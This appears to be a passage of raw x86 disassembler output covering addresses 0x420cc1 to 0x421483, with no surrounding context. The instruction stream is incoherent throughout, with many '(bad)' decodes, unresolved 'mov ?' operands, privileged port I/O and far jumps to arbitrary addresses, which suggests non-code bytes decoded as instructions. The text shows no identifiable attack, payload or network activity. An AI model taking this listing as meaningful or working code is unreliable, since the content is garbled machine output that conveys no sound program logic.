  420cc1:	mov    ch,0xd5
  420cc3:	hlt    
  420cc4:	stc    
  420cc5:	pop    ebx
  420cc6:	icebp  
  420cc7:	inc    ebx
  420cc8:	mov    eax,ds:0xa664d50d
  420ccd:	enter  0xce78,0xb5
  420cd1:	xor    WORD PTR [ebp-0x27],bp
  420cd5:	jns    0x420c73
  420cd7:	mov    esi,DWORD PTR [edx]
  420cd9:	js     0x420ce2
  420cdb:	sub    edi,DWORD PTR [ebp+0x2ac07e9b]
  420ce1:	or     bl,bl
  420ce3:	mov    eax,0x3e9f2891
  420ce8:	and    DWORD PTR [eax-0x4c],eax
  420ceb:	lods   al,BYTE PTR ds:[esi]
  420cec:	jl     0x420c81
  420cee:	add    bh,BYTE PTR [esi]
  420cf0:	push   ecx
  420cf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420cf2:	pop    edx
  420cf3:	sub    BYTE PTR [ebx+esi*2],0x44
  420cf7:	addr16 je 0x420d6f
  420cfa:	sbb    DWORD PTR [ebp+0x53],esp
  420cfd:	nop
  420cfe:	data16 jle 0x420c85
  420d01:	es mov eax,0x2a2aeb0f
  420d07:	sahf   
  420d08:	ret    
  420d09:	mov    ch,0xed
  420d0b:	popf   
  420d0c:	loope  0x420c95
  420d0e:	jns    0x420d07
  420d10:	adc    eax,0xf777822
  420d15:	mov    ebp,ecx
  420d17:	sbb    bh,BYTE PTR [esi+0x5c1b386e]
  420d1d:	dec    ebp
  420d1e:	adc    BYTE PTR [ebx+0x1f],bh
  420d21:	in     eax,dx
  420d22:	mov    bl,0x6a
  420d24:	jo     0x420cd3
  420d26:	sub    al,dl
  420d28:	iret   
  420d29:	out    dx,eax
  420d2a:	pop    ebx
  420d2b:	lahf   
  420d2c:	hlt    
  420d2d:	push   ds
  420d2e:	cdq    
  420d2f:	retf   0x63dc
  420d32:	enter  0xa021,0xf7
  420d36:	sub    bh,BYTE PTR [esi+0x52]
  420d39:	in     al,0xc8
  420d3b:	xor    edx,ebp
  420d3d:	cs mov esp,0x20e5511f
  420d43:	xchg   esp,eax
  420d44:	popf   
  420d45:	arpl   WORD PTR [eax-0x4],si
  420d48:	sbb    ecx,edx
  420d4a:	jne    0x420da5
  420d4c:	jmp    0x420db4
  420d4e:	jo     0x420ce7
  420d50:	add    edx,DWORD PTR [esi+0x402fd665]
  420d56:	outs   dx,DWORD PTR ds:[esi]
  420d57:	add    eax,0x9a78f1ed
  420d5c:	push   es
  420d5d:	cld    
  420d5e:	adc    dh,al
  420d60:	jae    0x420d09
  420d62:	jmp    0xe4dc:0xbd2d87a4
  420d69:	das    
  420d6a:	push   ecx
  420d6b:	sub    eax,0xb2cf1732
  420d70:	popf   
  420d71:	(bad)
  420d76:	popa   
  420d77:	lods   al,BYTE PTR ds:[esi]
  420d78:	jb     0x420daa
  420d7a:	xchg   dh,cl
  420d7c:	mov    WORD PTR [edx-0x1f],ss
  420d7f:	aaa    
  420d80:	fs push edi
  420d82:	and    DWORD PTR [ebx+esi*2+0x64092692],edi
  420d89:	xchg   edi,eax
  420d8a:	jmp    0x178eb114
  420d8f:	jnp    0x420de7
  420d91:	and    eax,0xc42f71ea
  420d96:	xchg   DWORD PTR [ebx],esi
  420d98:	mov    DWORD PTR [edx],edx
  420d9a:	outs   dx,DWORD PTR ds:[esi]
  420d9b:	popf   
  420d9c:	push   cs
  420d9d:	and    al,0x10
  420d9f:	xchg   edx,eax
  420da0:	test   al,0x30
  420da2:	daa    
  420da3:	int    0x19
  420da5:	ds xchg ebx,eax
  420da7:	cdq    
  420da8:	dec    BYTE PTR [esi]
  420daa:	je     0x420d96
  420dac:	ret    0xf675
  420daf:	int3   
  420db0:	cmp    bl,BYTE PTR [edi-0x6f6a4fad]
  420db6:	test   eax,ebp
  420db8:	sti    
  420db9:	fdivr  DWORD PTR [eax-0x23]
  420dbc:	add    DWORD PTR [ebx+0x81266d2],esp
  420dc2:	fst    QWORD PTR cs:[ebx+0x1268b789]
  420dc9:	dec    edx
  420dca:	das    
  420dcb:	cmp    DWORD PTR [edx-0x7f59f5a5],esi
  420dd1:	mov    dh,0x32
  420dd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420dd4:	(bad)  
  420dd5:	adc    bh,BYTE PTR [eax]
  420dd7:	pusha  
  420dd8:	ret    
  420dd9:	cld    
  420dda:	jb     0x420dc5
  420ddc:	add    DWORD PTR [esi],ebx
  420dde:	imul   ecx,DWORD PTR [edi-0x12bf4f41],0xa6cdfefc
  420de8:	hlt    
  420de9:	sub    al,0x38
  420deb:	lds    edx,FWORD PTR [edi+ebx*4+0x38]
  420def:	icebp  
  420df0:	jo     0x420e45
  420df2:	aam    0x74
  420df4:	cdq    
  420df5:	or     bl,BYTE PTR [edx]
  420df7:	popf   
  420df8:	int    0xc8
  420dfa:	call   0xc6b3e9b9
  420dff:	(bad)  
  420e00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e01:	pop    es
  420e02:	pop    edi
  420e03:	stos   BYTE PTR es:[edi],al
  420e04:	xor    al,0x38
  420e06:	jp     0x420dc7
  420e08:	cs jl  0x420db9
  420e0b:	push   esp
  420e0c:	mov    edi,DWORD PTR [ecx]
  420e0e:	(bad)  
  420e0f:	mov    esi,DWORD PTR [edx+0x7c]
  420e12:	and    BYTE PTR [eax-0x50],ch
  420e15:	sbb    DWORD PTR [ebx+0x3d5e323f],ebp
  420e1b:	adc    al,0xd8
  420e1d:	mov    edi,0xe1674892
  420e22:	push   0x3cde6b0c
  420e27:	xor    al,0xed
  420e29:	mov    ?,WORD PTR [esi]
  420e2b:	mov    edx,0x4e69ecf5
  420e30:	(bad)  
  420e32:	out    dx,al
  420e33:	hlt    
  420e34:	int    0x6d
  420e36:	inc    ecx
  420e37:	cdq    
  420e38:	je     0x420ddd
  420e3a:	mov    eax,0xd7d0447e
  420e3f:	sub    ebx,0xffffff8d
  420e42:	jp     0x420e6d
  420e44:	(bad)  
  420e45:	in     al,0x36
  420e47:	js     0x420df0
  420e49:	pop    esi
  420e4a:	mov    ebp,0x933de22e
  420e4f:	shl    BYTE PTR [ebp+0x6d30c18c],1
  420e55:	jb     0x420e4d
  420e57:	jnp    0x420dda
  420e59:	out    0x22,eax
  420e5b:	icebp  
  420e5c:	cli    
  420e5d:	cld    
  420e5e:	retf   
  420e5f:	mov    esi,0xf4b120f6
  420e64:	sub    bh,BYTE PTR [esi-0x3ca75955]
  420e6a:	ins    BYTE PTR es:[edi],dx
  420e6b:	cwde   
  420e6c:	addr16 daa 
  420e6e:	inc    edx
  420e6f:	mov    ds:0xf1b3b819,eax
  420e74:	mov    ebx,0xb9c73ae0
  420e79:	pop    edx
  420e7a:	pop    ebx
  420e7b:	test   al,0xba
  420e7d:	shr    BYTE PTR [ebp+0x53f58e8e],cl
  420e83:	les    esi,FWORD PTR [eax]
  420e85:	int3   
  420e86:	xor    ebx,ecx
  420e88:	stos   DWORD PTR es:[edi],eax
  420e89:	mov    bl,0x24
  420e8b:	mov    eax,ds:0xf9637769
  420e90:	into   
  420e91:	fnsave [eax]
  420e93:	das    
  420e94:	inc    eax
  420e95:	icebp  
  420e96:	dec    ebp
  420e97:	scas   eax,DWORD PTR es:[edi]
  420e98:	ja     0x420ef4
  420e9a:	(bad)  
  420e9b:	mov    esi,0xee544483
  420ea0:	mov    esp,0x7725be17
  420ea5:	mov    esi,0xda5c31df
  420eaa:	xchg   DWORD PTR ds:0xfe74b33c,eax
  420eb0:	jne    0x420e8c
  420eb2:	ins    DWORD PTR es:[edi],dx
  420eb3:	add    al,0xc6
  420eb5:	xor    eax,0xeb808f0d
  420eba:	ins    DWORD PTR es:[edi],dx
  420ebb:	js     0x420e7f
  420ebd:	pop    ds
  420ebe:	push   ecx
  420ebf:	add    eax,0xd81353b0
  420ec4:	pop    edi
  420ec5:	mov    edi,0x35bcec2a
  420eca:	adc    eax,0x9654ae0c
  420ecf:	sbb    esi,esi
  420ed1:	ret    
  420ed2:	ror    DWORD PTR [eax],cl
  420ed4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ed5:	or     eax,0xe9211d97
  420eda:	lods   al,BYTE PTR ds:[esi]
  420edb:	xchg   edx,eax
  420edc:	mov    ah,0x16
  420ede:	mov    bl,0x86
  420ee0:	mul    BYTE PTR [ecx-0x53]
  420ee3:	inc    edx
  420ee4:	bnd jp 0x420eb7
  420ee7:	mov    ds:0x66604526,eax
  420eec:	push   edi
  420eed:	shl    DWORD PTR [ecx],cl
  420eef:	pop    esp
  420ef0:	cmp    al,al
  420ef2:	fs mov esp,ebp
  420ef5:	cs push edi
  420ef7:	push   ebx
  420ef8:	call   0x8646fd81
  420efd:	and    esp,0x1d
  420f00:	fistp  WORD PTR [ebp+0x42]
  420f03:	xlat   BYTE PTR ds:[ebx]
  420f04:	push   0x3b2ec243
  420f09:	xchg   ebx,eax
  420f0a:	and    DWORD PTR [ebx+0x250ba2d3],edi
  420f10:	or     eax,0x58615a93
  420f15:	xchg   esp,eax
  420f16:	cmovg  ecx,DWORD PTR [edi+0x37]
  420f1a:	add    DWORD PTR [ecx-0x13],esp
  420f1d:	mov    ch,0xfc
  420f1f:	test   ecx,0x991e5df8
  420f25:	retf   
  420f26:	dec    ebx
  420f27:	push   eax
  420f28:	mov    ch,0x4
  420f2a:	xchg   ebx,eax
  420f2b:	(bad)  
  420f2d:	lods   eax,DWORD PTR ds:[esi]
  420f2e:	and    DWORD PTR [ecx+0x44395eb3],esi
  420f34:	xor    DWORD PTR [edx+eiz*4-0x343c62c2],esi
  420f3b:	out    dx,eax
  420f3c:	dec    eax
  420f3d:	cmp    DWORD PTR [ecx-0x1af0b0bb],ebx
  420f43:	fidivr DWORD PTR [edx]
  420f45:	mul    DWORD PTR [edi-0x58112e84]
  420f4b:	mov    al,ds:0x79e5ea99
  420f50:	cli    
  420f51:	loopne 0x420f46
  420f53:	and    ch,BYTE PTR [ebp+0x1a]
  420f56:	dec    esi
  420f57:	add    DWORD PTR [edi],eax
  420f59:	jb     0x420fd1
  420f5b:	adc    eax,0x4d758ace
  420f60:	fild   QWORD PTR [eax+0xc]
  420f63:	out    0xf8,eax
  420f65:	dec    eax
  420f66:	int    0xc3
  420f68:	sub    BYTE PTR [eax-0x77131eba],dh
  420f6e:	ins    DWORD PTR es:[edi],dx
  420f6f:	push   es
  420f70:	aas    
  420f71:	adc    ah,BYTE PTR [edx]
  420f73:	jge    0x420f47
  420f75:	outs   dx,DWORD PTR ds:[esi]
  420f76:	scas   eax,DWORD PTR es:[edi]
  420f77:	sti    
  420f78:	sub    bh,BYTE PTR [edx+0x4859b8e9]
  420f7e:	mov    ds:0x289bb1c8,al
  420f83:	aaa    
  420f84:	or     BYTE PTR [ebp-0x2db442f2],cl
  420f8a:	xchg   BYTE PTR [ecx],ch
  420f8c:	popf   
  420f8d:	push   ds
  420f8e:	mul    DWORD PTR [esi-0x3c]
  420f91:	xor    BYTE PTR ds:0xd0c6b67f,bl
  420f97:	mov    ds:0xfb6f94ae,al
  420f9c:	test   al,0xd1
  420f9e:	loope  0x420f6b
  420fa0:	push   es
  420fa1:	rcl    DWORD PTR [ebp+0x1e3b263a],1
  420fa7:	pop    es
  420fa8:	mov    WORD PTR [edi+0x6d1ff81e],ds
  420fae:	cs pop es
  420fb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fb1:	(bad)  
  420fb2:	xchg   ecx,eax
  420fb3:	out    dx,eax
  420fb4:	or     ebp,DWORD PTR [edx+eiz*4]
  420fb7:	icebp  
  420fb8:	lods   eax,DWORD PTR ds:[esi]
  420fb9:	mov    al,0x57
  420fbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fbc:	sti    
  420fbd:	pop    edi
  420fbe:	mov    ch,bh
  420fc0:	ret    
  420fc1:	cmp    eax,0xa10e7ec1
  420fc6:	pop    ebp
  420fc7:	mov    eax,ds:0x1c8dd67
  420fcc:	xor    ecx,ecx
  420fce:	mov    esp,DWORD PTR [esi-0x6e]
  420fd1:	sbb    DWORD PTR [eax+0x21],edx
  420fd4:	cs xchg ebp,eax
  420fd6:	mov    bl,0x5d
  420fd8:	jae    0x420fb9
  420fda:	and    ebp,0xa998a199
  420fe0:	jns    0x420f92
  420fe2:	pushf  
  420fe3:	jmp    0x420fe6
  420fe5:	js     0x420fc5
  420fe7:	(bad)  
  420fe8:	imul   ecx,DWORD PTR [ebx+0x4418ec3c],0xffffffae
  420fef:	xor    edx,DWORD PTR [ecx]
  420ff1:	adc    eax,0x9d0271bc
  420ff6:	retf   
  420ff7:	(bad)  
  420ff8:	aad    0x2e
  420ffa:	test   al,0x7a
  420ffc:	test   DWORD PTR [esi+edi*8],edi
  420fff:	jmp    0xdf325958
  421004:	and    ebp,DWORD PTR [ebp+0x29f211be]
  42100a:	imul   ebx,DWORD PTR [edx+eiz*2-0x2b],0xff852b05
  421012:	sub    esi,edi
  421014:	cmp    ah,BYTE PTR [ecx+0x23bf61f4]
  42101a:	or     ebx,DWORD PTR [edx+0x1e3da7d7]
  421020:	sub    eax,0x6ad17da4
  421025:	adc    edx,esp
  421027:	mov    ss,WORD PTR [edx-0x37]
  42102a:	cmp    BYTE PTR [eax+0x7ecdc048],cl
  421030:	sub    eax,0x635e8dbd
  421035:	add    ebp,eax
  421037:	out    0x55,al
  421039:	sub    al,0x8b
  42103b:	cmp    bh,BYTE PTR [ecx+0x1c]
  42103e:	ds inc esi
  421040:	sti    
  421041:	mov    esi,0x1dd9f6a4
  421046:	jecxz  0x421000
  421048:	ja     0x420fcd
  42104a:	inc    edx
  42104b:	fadd   QWORD PTR [edx+0x23]
  42104e:	push   ds
  42104f:	data16 sbb al,0x6d
  421052:	test   DWORD PTR [edx+0x7b],ebp
  421055:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421056:	mov    WORD PTR [ebx],ds
  421058:	add    cl,BYTE PTR [esi]
  42105a:	cmc    
  42105b:	stos   DWORD PTR es:[edi],eax
  42105c:	and    eax,0x5527dbfd
  421061:	bound  esp,QWORD PTR [esp+edi*4-0x6f]
  421065:	adc    edi,DWORD PTR [edx+0x72]
  421068:	out    dx,al
  421069:	mov    DWORD PTR [edi],ecx
  42106b:	jbe    0x421007
  42106d:	imul   edx,DWORD PTR [ecx],0xffffffce
  421070:	jns    0x421057
  421072:	mov    eax,0xff91f630
  421077:	sbb    eax,0xd2224d68
  42107c:	pop    ecx
  42107d:	adc    BYTE PTR [edx],al
  42107f:	cmp    BYTE PTR [eax-0x38db6df5],bl
  421085:	mov    eax,0x20646f95
  42108a:	inc    ebx
  42108b:	cmp    ebx,esp
  42108d:	or     bl,cl
  42108f:	out    dx,al
  421090:	mov    ebx,0x9f8deb5e
  421095:	cmp    al,0xb6
  421097:	add    esp,DWORD PTR [ebx-0x2a]
  42109a:	inc    esp
  42109b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42109c:	add    al,0xf4
  42109e:	sbb    eax,0xd45a0500
  4210a3:	cdq    
  4210a4:	sbb    DWORD PTR [esi+esi*8+0x7e6f41d6],esp
  4210ab:	retf   0x892c
  4210ae:	ret    0x44f6
  4210b1:	lock repnz xor dl,ah
  4210b5:	in     al,dx
  4210b6:	xchg   esi,eax
  4210b7:	rcr    DWORD PTR [esi],1
  4210b9:	idiv   BYTE PTR [eax+0x4b7d8fc4]
  4210bf:	pop    ecx
  4210c0:	retf   
  4210c1:	and    DWORD PTR [edi-0x7b],edx
  4210c4:	(bad)  
  4210c5:	fdiv   DWORD PTR [eax-0x102d7899]
  4210cb:	xor    eax,0x5d5c6962
  4210d0:	jmp    0x2ac9:0x68778c36
  4210d7:	cmp    al,0x75
  4210d9:	add    eax,0xfbbb3f18
  4210de:	dec    BYTE PTR [ebx+ebx*1+0x0]
  4210e2:	add    esi,DWORD PTR [ecx+ecx*4-0xd09d422]
  4210e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210ea:	loope  0x4210b1
  4210ec:	add    eax,0xebbaf1a2
  4210f1:	lods   al,BYTE PTR ds:[esi]
  4210f2:	pop    esp
  4210f3:	adc    DWORD PTR ds:0xeabefee0,esi
  4210f9:	jle    0x4210d0
  4210fb:	imul   eax,DWORD PTR [eax],0x1ca1bf4e
  421101:	add    BYTE PTR [esi-0x30],al
  421104:	lahf   
  421105:	push   es
  421106:	xor    ebx,esi
  421108:	xchg   esp,eax
  421109:	stos   BYTE PTR es:[edi],al
  42110a:	repnz retf 
  42110c:	mov    al,ds:0xd5e9a220
  421111:	loop   0x4210f1
  421113:	push   es
  421114:	pop    esp
  421115:	inc    ebp
  421116:	cld    
  421117:	xchg   edi,eax
  421118:	out    dx,eax
  421119:	fcmovne st,st(4)
  42111b:	inc    edx
  42111c:	sub    ecx,DWORD PTR ds:0xe495bf5
  421122:	and    BYTE PTR [eax+0x4],dl
  421125:	mov    dh,0x0
  421127:	sbb    eax,0x4e4f09f1
  42112c:	neg    DWORD PTR es:[esi]
  42112f:	or     eax,0x64e27605
  421134:	clc    
  421135:	mov    cl,0x9e
  421137:	leave  
  421138:	fsub   QWORD PTR [edx-0x5e]
  42113b:	jmp    0x19d0:0x16338fce
  421142:	xchg   esi,eax
  421143:	test   eax,0xc40d28e9
  421148:	cdq    
  421149:	inc    esp
  42114a:	sti    
  42114b:	fwait
  42114c:	fwait
  42114d:	inc    edx
  42114e:	xor    eax,0x47d1698c
  421153:	mov    bl,0xd0
  421155:	add    bl,BYTE PTR [esi+eax*1]
  421158:	pushf  
  421159:	retf   0xa1d9
  42115c:	pop    ebx
  42115d:	lods   eax,DWORD PTR ds:[esi]
  42115e:	rcl    BYTE PTR [ebp+0x7ae7775e],0x3f
  421165:	mov    esi,esp
  421167:	lahf   
  421168:	jno    0x421174
  42116a:	ror    DWORD PTR [edx],0x26
  42116d:	fdivr  QWORD PTR [ebp+0x67]
  421170:	in     eax,0x1b
  421172:	fs mov al,0x95
  421175:	mov    BYTE PTR [edx+0x55],bl
  421178:	out    dx,eax
  421179:	and    edi,DWORD PTR ds:0xeece2e21
  42117f:	inc    esi
  421180:	xor    al,0x43
  421182:	or     al,0x9d
  421184:	or     al,0x54
  421186:	cwde   
  421187:	push   edi
  421188:	fstp   st(7)
  42118a:	bound  edi,QWORD PTR [ebx-0x38189d4f]
  421190:	out    dx,eax
  421191:	in     al,0xbf
  421193:	and    DWORD PTR ds:0x5e5c0d9,edx
  421199:	pop    ebp
  42119a:	(bad)  
  42119b:	and    BYTE PTR [ebp-0x6f75119f],bh
  4211a1:	pop    edx
  4211a2:	shr    DWORD PTR [edx-0x4a],cl
  4211a5:	inc    ecx
  4211a6:	ins    BYTE PTR es:[edi],dx
  4211a7:	xchg   ecx,eax
  4211a8:	inc    eax
  4211a9:	or     ebp,esp
  4211ab:	dec    ebx
  4211ac:	pop    ds
  4211ad:	adc    al,0x2
  4211af:	(bad)  
  4211b0:	fcom   DWORD PTR [ebx+0x65b5e0d2]
  4211b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211b7:	dec    edx
  4211b8:	ss jge 0x421196
  4211bb:	(bad)  
  4211bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211bd:	mov    eax,ds:0x6a8791ce
  4211c2:	int3   
  4211c3:	push   0x68
  4211c5:	repz jnp 0x421238
  4211c8:	sbb    dh,BYTE PTR [ecx-0x26f2b1fb]
  4211ce:	or     BYTE PTR [edi-0x59],dh
  4211d1:	test   eax,0x1fee74cd
  4211d6:	cmc    
  4211d7:	mov    al,0x27
  4211d9:	jmp    0xe3dd8fac
  4211de:	pushf  
  4211df:	lods   al,BYTE PTR ds:[esi]
  4211e0:	and    ebp,DWORD PTR [eax]
  4211e2:	int    0xd1
  4211e4:	xor    dh,BYTE PTR [esi-0x2c]
  4211e7:	pop    ebp
  4211e8:	fiadd  WORD PTR [esi-0x52]
  4211eb:	shl    bl,cl
  4211ed:	jmp    0x421206
  4211ef:	call   0x6fb894fc
  4211f4:	cwde   
  4211f5:	sbb    al,0xd4
  4211f7:	mov    eax,0x50126460
  4211fc:	hlt    
  4211fd:	not    DWORD PTR [ecx]
  4211ff:	jae    0x4211e2
  421201:	lock push ebp
  421203:	aas    
  421204:	and    BYTE PTR [edx-0x147b7815],al
  42120a:	lock out 0x4c,al
  42120d:	scas   eax,DWORD PTR es:[edi]
  42120e:	push   0x90334151
  421213:	clc    
  421214:	fistp  WORD PTR [edi]
  421216:	mov    ch,0x61
  421218:	xchg   BYTE PTR [edx],dl
  42121a:	aas    
  42121b:	test   BYTE PTR [eax+0x6c458ddb],bl
  421221:	icebp  
  421222:	add    al,0xaa
  421224:	add    esp,ebx
  421226:	push   esi
  421227:	mov    ds:0xb47f0766,eax
  42122c:	xchg   esi,eax
  42122d:	xchg   DWORD PTR [ecx+0x56],ecx
  421230:	or     edi,DWORD PTR [ecx+0x672aaad4]
  421236:	stc    
  421237:	ret    0x4f47
  42123a:	pusha  
  42123b:	mov    dh,0xa5
  42123d:	adc    ebp,DWORD PTR [esi]
  42123f:	dec    esp
  421240:	sbb    ch,BYTE PTR [ebx-0x15]
  421243:	(bad)  
  421244:	dec    esp
  421245:	scas   al,BYTE PTR es:[edi]
  421246:	dec    esp
  421247:	mov    WORD PTR [edx-0x55bc4ed2],ss
  42124d:	lds    edi,FWORD PTR [ebp-0x26a63931]
  421253:	xchg   edx,eax
  421254:	fwait
  421255:	adc    al,0x51
  421257:	test   DWORD PTR [esi+0x42],eax
  42125a:	sub    BYTE PTR [ecx+0xe],bl
  42125d:	jno    0x4211f2
  42125f:	(bad)
  421263:	fwait
  421264:	push   ds
  421265:	les    edx,FWORD PTR [esi+ecx*8-0xc]
  421269:	mov    esi,ebx
  42126b:	mov    cl,0xf7
  42126d:	xor    bl,bl
  42126f:	popa   
  421270:	loop   0x42124b
  421272:	jecxz  0x42123e
  421274:	neg    eax
  421276:	sbb    esi,DWORD PTR [ebx-0x56]
  421279:	mov    dh,0xed
  42127b:	cld    
  42127c:	and    al,0xe
  42127e:	push   esp
  42127f:	neg    DWORD PTR [esi+0x49d83823]
  421285:	dec    ebx
  421286:	aam    0x4
  421288:	jecxz  0x4212ab
  42128a:	mov    eax,ds:0x73cb3221
  42128f:	cmp    BYTE PTR [esp+eax*4-0x78],al
  421293:	add    cl,0x94
  421296:	lahf   
  421297:	jl     0x421265
  421299:	pop    esi
  42129a:	sahf   
  42129b:	jae    0x421300
  42129d:	jbe    0x42131d
  42129f:	adc    BYTE PTR [ecx],ch
  4212a1:	sbb    bh,BYTE PTR [ebx-0x16]
  4212a4:	imul   esi,DWORD PTR [esi],0x105d9d60
  4212aa:	stos   BYTE PTR es:[edi],al
  4212ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212ac:	xor    DWORD PTR [esi],esp
  4212ae:	mov    ch,0xd0
  4212b0:	pop    edx
  4212b1:	dec    ecx
  4212b2:	sbb    BYTE PTR [ebp+0x7749e139],0x2
  4212b9:	ret    
  4212ba:	mov    ?,WORD PTR [eax-0x119ffa00]
  4212c0:	jg     0x4212fb
  4212c2:	mov    bh,0xa8
  4212c4:	jnp    0x421285
  4212c6:	push   edi
  4212c7:	add    al,0x5c
  4212c9:	lods   al,BYTE PTR ds:[esi]
  4212ca:	sbb    eax,0xf5187c58
  4212cf:	push   ss
  4212d0:	(bad)  
  4212d1:	push   eax
  4212d2:	ret    0x7b72
  4212d5:	std    
  4212d6:	mov    ebp,0xd904c103
  4212db:	fisubr WORD PTR [edx+ebx*4-0x7280ad42]
  4212e2:	loopne 0x4212ba
  4212e4:	mov    ebx,0x801967b4
  4212e9:	bound  edi,QWORD PTR ds:0xd4f3
  4212ee:	jp     0x4212db
  4212f0:	push   0xffffffab
  4212f2:	retf   
  4212f3:	retf   
  4212f4:	into   
  4212f5:	lds    ebx,FWORD PTR [edx]
  4212f7:	add    al,0x3a
  4212f9:	push   edi
  4212fa:	mov    bh,0x96
  4212fc:	aad    0x0
  4212fe:	ins    DWORD PTR es:[edi],dx
  4212ff:	mov    ch,dh
  421301:	lea    edi,[esi-0x1d]
  421304:	xchg   esp,eax
  421305:	push   esp
  421306:	gs cld 
  421308:	aaa    
  421309:	push   esp
  42130a:	pop    ecx
  42130b:	or     BYTE PTR [ebx+0x64],ch
  42130e:	jle    0x4212fb
  421310:	or     esi,DWORD PTR [edx-0x5820bf2e]
  421316:	(bad)  
  421317:	jno    0x4212c2
  421319:	loopne 0x4212df
  42131b:	cmp    BYTE PTR [ecx],ah
  42131d:	push   0xe411cf1f
  421322:	hlt    
  421323:	mov    cl,0x1d
  421325:	dec    eax
  421326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421327:	idiv   dh
  421329:	jp     0x421329
  42132b:	xchg   esp,eax
  42132c:	cdq    
  42132d:	adc    BYTE PTR [edx],ah
  42132f:	inc    BYTE PTR [ecx+ecx*2-0x40]
  421333:	xor    ebx,DWORD PTR [eax+0x3d]
  421336:	sub    al,0x62
  421338:	inc    edx
  421339:	mov    ds:0x99886232,eax
  42133e:	jp     0x4212c8
  421340:	(bad)  
  421342:	in     al,0x52
  421344:	fisttp DWORD PTR [eax+0x6953ecb0]
  42134a:	ja     0x42138a
  42134c:	mov    ds:0x61ba6aa4,eax
  421351:	mov    ebp,ebp
  421353:	lahf   
  421354:	sub    ebp,DWORD PTR [edi-0x63]
  421357:	inc    ebp
  421358:	dec    edi
  421359:	icebp  
  42135a:	xchg   edx,eax
  42135b:	dec    ebp
  42135c:	rcr    DWORD PTR [esi-0x4c2cec44],0x7e
  421363:	iret   
  421364:	ja     0x42137a
  421366:	rcl    DWORD PTR [ebp+0x8b7f1f8],1
  42136c:	or     BYTE PTR [ecx],bh
  42136e:	and    ecx,DWORD PTR [edx-0x8816763]
  421374:	or     al,0xe8
  421376:	adc    eax,0x51b955da
  42137b:	nop
  42137c:	pop    ebp
  42137d:	outs   dx,BYTE PTR ds:[esi]
  42137e:	imul   eax,DWORD PTR [ebp+0x65],0x5d
  421382:	outs   dx,BYTE PTR ds:[esi]
  421383:	in     eax,0x24
  421385:	cs jo  0x421364
  421388:	in     al,dx
  421389:	lock jmp 0x410a34f7
  42138f:	scas   eax,DWORD PTR es:[edi]
  421390:	cmp    ecx,DWORD PTR [esi]
  421392:	repz push esp
  421394:	cmc    
  421395:	les    edx,FWORD PTR [eax+0x6ed2513e]
  42139b:	xor    eax,0x62d58cd4
  4213a0:	cld    
  4213a1:	js     0x421330
  4213a3:	in     al,dx
  4213a4:	idiv   DWORD PTR [eax-0x30]
  4213a7:	sub    DWORD PTR [edi+0x72],ebx
  4213aa:	jge    0x421362
  4213ac:	adc    eax,0xaf660e9f
  4213b1:	sbb    al,0xe9
  4213b3:	es push eax
  4213b5:	jecxz  0x421350
  4213b7:	pop    edx
  4213b8:	aaa    
  4213b9:	in     eax,0xc
  4213bb:	les    esp,FWORD PTR [esi]
  4213bd:	dec    eax
  4213be:	int3   
  4213bf:	(bad)  
  4213c0:	ins    DWORD PTR es:[edi],dx
  4213c1:	lods   eax,DWORD PTR ds:[esi]
  4213c2:	jo     0x4213c2
  4213c4:	push   esi
  4213c5:	add    BYTE PTR [edi+edi*4-0x216e43b3],0xac
  4213cd:	call   0x13c2:0x1ed6c077
  4213d4:	xchg   edi,eax
  4213d5:	push   esi
  4213d6:	add    BYTE PTR [ecx+0x6f3c8f25],0xaa
  4213dd:	cwde   
  4213de:	cmp    ecx,ecx
  4213e0:	add    BYTE PTR ds:0xf817f2a1,al
  4213e6:	mov    ch,0x77
  4213e8:	inc    esi
  4213e9:	add    al,ah
  4213eb:	jl     0x42145e
  4213ed:	cmp    dl,0x4
  4213f0:	test   DWORD PTR ds:0x6964c157,edx
  4213f6:	pop    edx
  4213f7:	ins    DWORD PTR es:[edi],dx
  4213f8:	(bad)  
  4213f9:	es (bad) 
  4213fb:	xlat   BYTE PTR ds:[ebx]
  4213fc:	fs inc ecx
  4213fe:	mov    al,al
  421400:	hlt    
  421401:	xchg   ecx,eax
  421402:	call   0x82e9c834
  421407:	ret    0x5dc4
  42140a:	xchg   edi,eax
  42140b:	pop    eax
  42140c:	mov    esi,0xe89d288d
  421411:	dec    DWORD PTR [esi]
  421413:	inc    edi
  421414:	call   0x454e437
  421419:	xor    dh,BYTE PTR [ebp+0x66a80135]
  42141f:	dec    ecx
  421420:	js     0x4213ae
  421422:	popf   
  421423:	mov    dl,BYTE PTR [edx+0x2c05fb71]
  421429:	aam    0x46
  42142b:	jbe    0x4214a4
  42142d:	in     al,dx
  42142e:	adc    eax,0xd7649f2d
  421433:	in     eax,0x1b
  421435:	shl    BYTE PTR [edi+0x26],1
  421438:	pop    ds
  421439:	mov    esp,0x2c666c09
  42143e:	mov    dl,0xf4
  421440:	add    al,BYTE PTR [eax+0x2c8ff9cb]
  421446:	sbb    DWORD PTR [eax],ebp
  421448:	popf   
  421449:	mov    cl,0xde
  42144b:	add    ecx,DWORD PTR gs:[eax]
  42144e:	inc    esp
  42144f:	cmp    DWORD PTR [ecx+eiz*1+0x35],ebx
  421453:	aam    0x72
  421455:	push   ds
  421456:	mov    bl,BYTE PTR [eax+0x56670058]
  42145c:	out    dx,al
  42145d:	repz cld 
  42145f:	test   cl,0xa9
  421462:	push   ecx
  421463:	push   eax
  421464:	pop    edi
  421465:	gs pushf 
  421467:	xor    eax,DWORD PTR [esi]
  421469:	mov    dh,0x42
  42146b:	dec    eax
  42146c:	(bad)  
  42146d:	call   0xd591:0xf9687a7b
  421474:	setne  BYTE PTR [ebp+0x3af12905]
  42147b:	inc    ebx
  42147c:	and    DWORD PTR [esi],esi
  42147e:	mov    eax,0x9cf5e204
  421483:	push   cs
